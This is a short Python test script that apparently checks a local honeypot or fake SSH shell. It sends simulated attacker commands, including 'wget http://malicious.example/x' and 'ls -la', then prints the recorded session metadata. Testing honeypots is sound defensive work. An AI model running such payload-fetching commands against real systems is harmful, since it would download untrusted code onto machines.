import socket, time, json, pathlib, sys

def run_test():
    try:
        s = socket.socket()
        s.settimeout(20)
        s.connect(('127.0.0.1', 2222))
        print('BANNER:', s.recv(4096).decode(errors='ignore'))
        s.send(b'wget http://malicious.example/x\n')
        # wait so server has time to save placeholder
        time.sleep(2.0)
        try:
            print('AFTER_WGET:', s.recv(4096).decode(errors='ignore'))
        except Exception as e:
            print('AFTER_WGET: recv failed:', repr(e))
        s.send(b'ls -la\n')
        time.sleep(0.6)
        try:
            print('LS_REPLY:', s.recv(8192).decode(errors='ignore'))
        except Exception as e:
            print('LS_REPLY: recv failed:', repr(e))
        s.close()
    except Exception as e:
        print('CLIENT ERROR:', repr(e))
        return

    # print the newest session meta.json
    try:
        sessions = sorted(pathlib.Path('data/sessions').iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        if not sessions:
            print('\\nNO_SESSION_FOUND')
            return
        d = sessions[0]
        p = d / 'meta.json'
        print('\\nUSING_SESSION_DIR:', d)
        print(json.dumps(json.load(open(p, 'r', encoding='utf-8')), indent=2))
    except Exception as e:
        print('META ERROR:', repr(e))

if __name__ == "__main__":
    run_test()
